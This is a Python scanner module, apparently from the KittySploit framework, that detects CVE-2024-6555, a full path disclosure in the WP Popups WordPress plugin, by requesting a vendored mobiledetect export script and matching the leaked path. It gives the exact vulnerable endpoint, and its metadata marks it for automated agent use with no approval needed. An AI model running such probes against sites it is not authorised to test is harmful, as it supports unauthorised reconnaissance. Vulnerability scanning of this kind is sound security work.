#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""WP Popups - WordPress Popup builder plugin for WordPress contains a full path disclosure caused by using mobil."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WP Popups - Information Disclosure Detection',
        'description': 'WP Popups - WordPress Popup builder plugin for WordPress contains a full path disclosure caused by using mobiledetect without access restrictions, letting unauthenticated attackers retrieve server paths, exploit requires no specific conditions.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2024', 'wordpress', 'wp', 'wp-plugin', 'wp-popups-lite', 'fpd'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/wp-popups-lite/wp-popups-wordpress-popup-builder-2201-unauthenticated-full-path-disclosure',
            'https://nvd.nist.gov/vuln/detail/CVE-2024-6555',
            'https://plugins.trac.wordpress.org/changeset?sfp_email=&sfph_mail=&reponame=&old=3115849%40wp-popups-lite&new=3115849%40wp-popups-lite&sfp_email=&sfph_mail=',
            'https://www.wordfence.com/threat-intel/vulnerabilities/id/578892f2-9841-4493-8445-61b79feb4764?source=cve',
        ],
        'cve': 'CVE-2024-6555',
    }

    def run(self):
        path = '/wp-content/plugins/wp-popups-lite/src/vendor/mobiledetect/mobiledetectlib/export/exportToJSON.php'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        content_type = r.headers.get("Content-Type") or r.headers.get("content-type") or ""
        ctype_any = ('text/html',)
        body_regexes = ('/[a-zA-Z0-9_\\-/]+/wp-content/plugins/wp-popups-lite/src/vendor/mobiledetect/mobiledetectlib/Mobile_Detect\\.json',)
        if (any(m in content_type for m in ctype_any)) and (any(re.search(rx, body) for rx in body_regexes)):
            self.set_info(
                severity='medium',
                reason='WP Popups - Information Disclosure detected',
                path=path,
            )
            return True
        return False

